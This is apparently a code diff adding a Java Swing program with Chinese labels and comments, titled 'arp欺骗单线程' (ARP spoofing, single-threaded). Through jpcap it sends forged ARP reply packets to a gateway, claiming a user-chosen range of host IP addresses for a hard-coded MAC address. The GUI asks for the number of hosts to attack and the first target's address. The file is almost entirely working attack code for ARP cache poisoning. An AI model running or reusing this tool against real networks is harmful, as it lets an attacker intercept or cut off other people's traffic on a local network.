@@ -1,0 +1,220 @@
+
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.util.Scanner;
+import java.util.Timer;
+import java.util.TimerTask;
+
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JLabel;
+import javax.swing.JOptionPane;
+import javax.swing.JPanel;
+import javax.swing.JTextField;
+import jpcap.JpcapCaptor;
+import jpcap.JpcapSender;
+import jpcap.NetworkInterface;
+import jpcap.packet.ARPPacket;
+import jpcap.packet.EthernetPacket;
+
+import java.awt.BorderLayout;
+import java.awt.Container;
+import java.awt.Dimension;
+import java.awt.FlowLayout;
+import java.awt.Frame;
+import java.awt.Label;
+import java.awt.Toolkit;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.io.*;
+class Thread2 extends Thread{
+	@Override 
+	public void run(){
+		super.run();
+		System.out.println("");
+		
+	}
+}
+//这并不是多线程的问题
+public class SendFakeARP extends JFrame{
+	JLabel wangguanduankouhao;
+    JLabel gongjizhujishu;
+    JLabel duankouhaoqianzhui;
+    JLabel kaishigongjidezhujiipzuihou;
+    JPanel p;
+    JButton JButton1;
+    JTextField wangguanduankouhaotext;
+    JTextField gongjizhujishutext;
+    JTextField duankouhaoqianzhuitext;
+    JTextField kaishigongjizhujiipzuihou;
+    String wangguanshuru;
+    String gongjizhujishus;
+    String duankouhaoqianzhuis;
+    String kaishigongjidezhujiipzuihous;
+	int gongjizhujishut;
+	int kaishizhujiipi;
+    static byte[] stomac(String s) {
+        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
+        String[] s1 = s.split("-");
+        for (int x = 0; x < s1.length; x++) {
+            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
+        }
+        return mac;
+    }
+    public SendFakeARP(){
+    	  Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
+    	  int w = getSize().width;//获取窗体宽度                getSize()返回组件的宽度和高度，所以把它们作为Dimension对象返回。Dimension有两个成员，一个是width,表示宽度值，另一个是height,表示高度。总之，getSize().width返回组件的宽度。
+          int h = getSize().height;//获取窗体高度
+          int x = (dim.width-w)/2;
+          int y = (dim.height-h)/2;
+          setLocation(x,y);//将窗口移到中间
+    	  Container cp = this.getContentPane();
+          cp.setLayout(new BorderLayout());
+    	  p = new JPanel();
+    	  p.setLayout(new FlowLayout());
+    	  wangguanduankouhao = new JLabel("输入网关端口号:");
+    	  gongjizhujishu = new JLabel("攻击主机数:");
+    	  duankouhaoqianzhui = new JLabel("端口号前缀");
+    	  kaishigongjidezhujiipzuihou = new JLabel("开始攻击的主机ip最后:");
+    	  JButton1 = new JButton("开始发送假的arp包");
+    	  wangguanduankouhaotext = new JTextField(23);
+    	  gongjizhujishutext = new JTextField(25);
+    	  duankouhaoqianzhuitext = new JTextField(25);
+    	  kaishigongjizhujiipzuihou=new  JTextField(21); 
+    	
+    	  p.add(wangguanduankouhao);
+    	  p.add(wangguanduankouhaotext);
+    	  p.add(gongjizhujishu);
+    	  p.add(gongjizhujishutext);
+    	  p.add(duankouhaoqianzhui);
+    	  p.add(duankouhaoqianzhuitext);
+    	  p.add(kaishigongjidezhujiipzuihou);
+    	  p.add(kaishigongjizhujiipzuihou);
+    	  p.add(JButton1);
+    	  cp.add(p);
+//    	  JButton1.addActionListener(this);//实现一个监听接口
+    }
+//    public void actionPerformed(ActionEvent e)
+//    {
+//    	if (e.getSource()==JButton1)
+//    	{
+//    		wangguanshuru= wangguanduankouhaotext.getText();
+//    		 gongjizhujishus=  gongjizhujishu.getText();
+//    		 gongjizhujishut =Integer.parseInt(gongjizhujishus);
+//    		 duankouhaoqianzhuis=  duankouhaoqianzhui.getText();
+//    		 kaishigongjidezhujiipzuihous = kaishigongjizhujiipzuihou.getText();
+//    		 kaishizhujiipi = Integer.parseInt(kaishigongjidezhujiipzuihous);
+//    	}
+//          
+//   	 else {
+//            String yuju4 ="退出攻击系统";
+//            JOptionPane.showMessageDialog(null, yuju4);
+//        }
+//
+//}
+    public int getgongjizhujishut()
+    {
+    	return gongjizhujishut;
+    }
+
+ 
+    public static void main(String[]args) throws Exception {
+               JFrame.setDefaultLookAndFeelDecorated(true);
+    	SendFakeARP frame = new SendFakeARP();
+    	frame.setTitle("arp欺骗单线程");
+    	frame.setSize(400,300);
+    	frame.setVisible(true);
+        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        frame.JButton1.addActionListener(new ActionListener()
+        		{
+        	public void actionPerformed(ActionEvent e)
+        	{
+        		if (e.getSource()==frame.JButton1)
+        		{
+        		 frame.wangguanshuru= (String)frame.wangguanduankouhaotext.getText();
+        		 frame.gongjizhujishus=(String) frame.gongjizhujishutext.getText();
+        		 frame.gongjizhujishut =Integer.parseInt(frame.gongjizhujishus);
+        		 frame.duankouhaoqianzhuis= (String)frame.duankouhaoqianzhuitext.getText();//出问题的地方
+        		 frame.kaishigongjidezhujiipzuihous = (String)frame.kaishigongjizhujiipzuihou.getText();
+        		 frame.kaishizhujiipi = Integer.parseInt(frame.kaishigongjidezhujiipzuihous);
+        		 System.out.println(frame.duankouhaoqianzhuis);//实例对象的引用有问题
+        		 System.out.println(frame.wangguanshuru);
+        		 System.out.println(frame.gongjizhujishus);
+        		 System.out.println(frame.gongjizhujishut);
+        		 System.out.println(frame.kaishigongjidezhujiipzuihous);
+        		 System.out.println(frame.kaishizhujiipi);
+        		         	    	int time = 2;
+        	    	outo:for(int i=0;i<(frame.getgongjizhujishut());i++)
+        	     	{
+        	     	
+        	     String ips = frame.duankouhaoqianzhuis + ((frame.kaishizhujiipi)+i) ;
+        	     System.out.println(ips);
+        	     InetAddress desip = null;
+				try {
+					desip = InetAddress.getByName(frame.wangguanshuru);
+				} catch (UnknownHostException e1) {
+					// TODO Auto-generated catch block
+					e1.printStackTrace();
+				}
+        	     byte[] desmac = stomac("00-0f-e2-7b-7b-02");
+        	     InetAddress srcip = null;
+				try {
+					srcip = InetAddress.getByName(ips);
+				} catch (UnknownHostException e1) {
+					// TODO Auto-generated catch block
+					e1.printStackTrace();
+				}
+        	     byte[] srcmac = stomac("00-1C-23-2E-A7-0A");
+
+        	     NetworkInterface[] devices = JpcapCaptor.getDeviceList();
+        	     NetworkInterface device = devices[0];
+        	     JpcapSender sender = null;
+				try {
+					sender = JpcapSender.openDevice(device);
+				} catch (IOException e1) {
+					// TODO Auto-generated catch block
+					e1.printStackTrace();
+				}
+
+        	     ARPPacket arp = new ARPPacket();
+        	     arp.hardtype = ARPPacket.HARDTYPE_ETHER;
+        	     arp.prototype = ARPPacket.PROTOTYPE_IP;
+        	     arp.operation = ARPPacket.ARP_REPLY;
+        	     arp.hlen = 6;
+        	     arp.plen = 4;
+        	     arp.sender_hardaddr = srcmac;
+        	     arp.sender_protoaddr = srcip.getAddress();
+        	     arp.target_hardaddr = desmac;
+        	     arp.target_protoaddr = desip.getAddress();
+
+        	     EthernetPacket ether = new EthernetPacket();
+        	     ether.frametype = EthernetPacket.ETHERTYPE_ARP;
+        	     ether.src_mac = srcmac;
+        	     ether.dst_mac = desmac;
+        	     arp.datalink = ether;
+        	         System.out.println("sending arp.."+(frame.kaishizhujiipi+i));
+        	         sender.sendPacket(arp);
+        	         try {
+						Thread.sleep(time * 200);
+					} catch (InterruptedException e1) {
+						// TODO Auto-generated catch block
+						e1.printStackTrace();
+					}
+        	         if(i==frame.gongjizhujishut-1)
+        	         {
+        	         String string1 ="一轮包已经发送完成     按开始发送假的arp包继续向目标主机发送";
+        	         JOptionPane.showMessageDialog(null, string1);
+        	         
+        	         
+        	         continue outo; 
+        	         }
+        	     	
+        	     	}
+        		}
+        	}
+        	
+        		});
+        
+    
+    }
+}
